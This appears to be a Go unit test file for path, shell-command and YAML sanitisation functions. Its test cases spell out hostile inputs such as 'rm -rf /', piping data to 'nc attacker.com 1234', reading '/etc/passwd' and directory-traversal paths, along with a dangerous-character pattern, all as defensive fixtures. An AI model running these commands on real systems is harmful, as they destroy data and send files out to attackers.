package generator

import (
	"regexp"
	"strings"
	"testing"
)

// TestSanitizePath tests path sanitization against directory traversal
func TestSanitizePath(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "normal path",
			input:    "normal/path/file.yaml",
			expected: "normal/path/file.yaml",
		},
		{
			name:     "directory traversal with ../",
			input:    "../../../etc/passwd",
			expected: "passwd",
		},
		{
			name:     "absolute path",
			input:    "/etc/passwd",
			expected: "passwd",
		},
		{
			name:     "mixed traversal",
			input:    "/home/../../../etc/passwd",
			expected: "passwd",
		},
		{
			name:     "clean relative path",
			input:    "./config/app.yaml",
			expected: "config/app.yaml",
		},
		{
			name:     "multiple directory traversals",
			input:    "normal/../../../sensitive",
			expected: "sensitive",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizePath(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizePath(%q) = %q; want %q", tt.input, result, tt.expected)
			}
		})
	}
}

// TestSanitizeCommand tests command sanitization against injection
func TestSanitizeCommand(t *testing.T) {
	// Test dangerous characters are removed - these should all be detected and removed
	dangerousChars := []string{";", "&", "|", "<", ">", "(", ")", "$", "`"}
	dangerousCharsRegex := regexp.MustCompile("[;&|<>()$`]")
	
	for _, char := range dangerousChars {
		t.Run("dangerous_char_"+char, func(t *testing.T) {
			if !dangerousCharsRegex.MatchString(char) {
				t.Errorf("expected dangerous char %q to match regex", char)
			}
			
			input := "safe" + char + "command"
			result := SanitizeCommand(input)
			
			// Should not contain the dangerous character after sanitization
			if strings.Contains(result, char) {
				t.Errorf("SanitizeCommand(%q) = %q; dangerous char %q should be removed", input, result, char)
			}
		})
	}
	
	// Test safe characters are preserved
	safeInputs := []string{
		"abc",
		"Name_1", 
		"value-2",
		"HELLO world 123",
		"command_with-dashes",
		"CamelCase123",
	}
	
	dangerousCharsRegex = regexp.MustCompile("[;&|<>()$`]")
	for _, input := range safeInputs {
		t.Run("safe_input_"+input, func(t *testing.T) {
			if dangerousCharsRegex.MatchString(input) {
				t.Errorf("did not expect safe string %q to match dangerous chars regex", input)
			}
			
			result := SanitizeCommand(input)
			if result != input {
				t.Errorf("SanitizeCommand(%q) = %q; safe input should be unchanged", input, result)
			}
		})
	}
	
	// Test complex injection attempts
	injectionTests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "command injection with semicolon",
			input:    "ls; rm -rf /",
			expected: "ls rm -rf /",
		},
		{
			name:     "pipe injection",
			input:    "cat file | nc attacker.com 1234",
			expected: "cat file  nc attacker.com 1234",
		},
		{
			name:     "background execution",
			input:    "sleep 10 &",
			expected: "sleep 10 ",
		},
		{
			name:     "command substitution with backticks",
			input:    "echo `whoami`",
			expected: "echo whoami",
		},
		{
			name:     "variable substitution",
			input:    "echo $HOME",
			expected: "echo HOME",
		},
		{
			name:     "redirection attempts",
			input:    "cat /etc/passwd > output.txt",
			expected: "cat /etc/passwd  output.txt",
		},
		{
			name:     "multiple dangerous chars",
			input:    "cmd; echo $USER | nc host &",
			expected: "cmd echo USER  nc host ",
		},
	}
	
	for _, tt := range injectionTests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeCommand(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeCommand(%q) = %q; want %q", tt.input, result, tt.expected)
			}
			
			// Ensure no dangerous characters remain
			for _, char := range dangerousChars {
				if strings.Contains(result, char) {
					t.Errorf("SanitizeCommand(%q) result %q still contains dangerous char %q", tt.input, result, char)
				}
			}
		})
	}
}

// TestValidateBinaryContent tests binary content validation
func TestValidateBinaryContent(t *testing.T) {
	// Test valid YAML content
	validYAMLTests := []struct {
		name    string
		content string
	}{
		{
			name: "simple key-value",
			content: "key: value\n",
		},
		{
			name: "multiple keys",
			content: "key: value\nanother_key: 123\nNAME-1: something\n",
		},
		{
			name: "keys with underscores and dashes",
			content: "app_name: myapp\napp-version: 1.0.0\nconfig_file: app.yaml\n",
		},
		{
			name: "keys with numbers",
			content: "key1: value1\nkey2: value2\nversion_123: latest\n",
		},
		{
			name: "whitespace variations",
			content: "key: value\n  indented_key: indented_value\nkey2:value2\n",
		},
	}
	
	for _, tt := range validYAMLTests {
		t.Run("valid_yaml_"+tt.name, func(t *testing.T) {
			content := []byte(tt.content)
			if !ValidateBinaryContent(content) {
				t.Errorf("ValidateBinaryContent(%q) = false; expected valid YAML to pass", tt.content)
			}
		})
	}
	
	// Test invalid YAML content
	invalidYAMLTests := []struct {
		name    string
		content string
	}{
		{
			name: "missing colon",
			content: "key value\n",
		},
		{
			name: "empty key",
			content: ": value\n",
		},
		{
			name: "special characters in key",
			content: "key@: value\n",
		},
		{
			name: "line without value",
			content: "key:\n",
		},
		{
			name: "tabs instead of spaces",
			content: "key:\tvalue\n",  // contains tab character
		},
		{
			name: "invalid key characters",
			content: "key.with.dots: value\n",
		},
		{
			name: "line ending without newline",
			content: "key: value",  // no trailing newline
		},
	}
	
	for _, tt := range invalidYAMLTests {
		t.Run("invalid_yaml_"+tt.name, func(t *testing.T) {
			content := []byte(tt.content)
			if ValidateBinaryContent(content) {
				t.Errorf("ValidateBinaryContent(%q) = true; expected invalid YAML to fail", tt.content)
			}
		})
	}
	
	// Test size limits
	t.Run("content_too_large", func(t *testing.T) {
		// Create content larger than 5MB
		largeContent := make([]byte, 6*1024*1024)
		for i := range largeContent {
			largeContent[i] = 'a'
		}
		
		if ValidateBinaryContent(largeContent) {
			t.Error("ValidateBinaryContent() = true; expected large content to fail")
		}
	})
	
	// Test binary content detection
	t.Run("binary_content", func(t *testing.T) {
		// Content with null bytes and other non-printable characters
		binaryContent := []byte{0x00, 0x01, 0x02, 'h', 'e', 'l', 'l', 'o'}
		
		if ValidateBinaryContent(binaryContent) {
			t.Error("ValidateBinaryContent() = true; expected binary content to fail")
		}
	})
	
	// Test allowed non-printable characters (tab, newline, carriage return)
	t.Run("allowed_control_chars", func(t *testing.T) {
		// Content with allowed control characters: tab(9), newline(10), carriage return(13)
		validContent := []byte("key: value\nkey2: value2\rkey3:\tvalue3\n")
		
		if !ValidateBinaryContent(validContent) {
			t.Error("ValidateBinaryContent() = false; expected content with valid control chars to pass")
		}
	})
}

// TestYAMLValidationRegex tests the YAML validation regex directly
func TestYAMLValidationRegex(t *testing.T) {
	yamlValidationRegex := regexp.MustCompile(`^(\s*[a-zA-Z0-9_-]+\s*:\s*[^\n]+\n)*$`)
	
	validCases := []string{
		"key: value\n",
		"key: value\nanother_key: 123\n",
		"NAME-1: something\n",
		"app_name: myapp\nversion_2: 1.0\n",
		"  indented: value\n",
		"key:value\n",
		"",  // empty string should match
	}
	
	for _, tc := range validCases {
		t.Run("valid_regex_"+strings.ReplaceAll(tc, "\n", "\\n"), func(t *testing.T) {
			if !yamlValidationRegex.MatchString(tc) {
				t.Errorf("YAML regex should match %q", tc)
			}
		})
	}
	
	invalidCases := []string{
		"key value\n",        // missing colon
		": value\n",          // empty key
		"key@: value\n",      // invalid key character
		"key: value",         // missing newline
		"key: value\n\n",     // extra newline
		"key:\n",             // missing value
		"key.invalid: value\n", // dot in key
	}
	
	for _, tc := range invalidCases {
		t.Run("invalid_regex_"+strings.ReplaceAll(tc, "\n", "\\n"), func(t *testing.T) {
			if yamlValidationRegex.MatchString(tc) {
				t.Errorf("YAML regex should NOT match %q", tc)
			}
		})
	}
}